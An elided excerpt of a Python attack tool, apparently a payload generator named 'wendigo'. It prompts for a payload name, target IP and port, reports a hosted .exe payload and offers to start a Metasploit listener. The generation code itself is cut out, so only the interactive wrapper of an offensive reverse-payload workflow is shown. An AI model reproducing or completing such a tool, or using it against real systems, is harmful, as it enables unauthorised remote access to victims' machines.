...
def wendigo():
    ...
    payloadname = input(f'Payload Name: ')
    if payloadname == "":
        print(f"Payload Name can't be blank")
        exit()
    else:
        payloadname = str(payloadname)
    targetip = input(f'Payload Target IP (Default: {host}): ')
    if str(targetip) == "":
        targetip = str(host)
    else:
        targetip = str(targetip)
    targetport = input(f'Payload Target Port (Default: 4200): ')
    if str(targetport) == "":
        targetport = 4200
    else:
    ...
    time.sleep(2)
    print(f'Payload Availible At {host}/{payloadname}.exe')
    listener = input(f'Start Metasploit Listener? [Y/n]: ')
...
if __name__ == "__main__":
    try:
        ...
        print(f"\nKeyboardInterupt Detected, Exiting...")
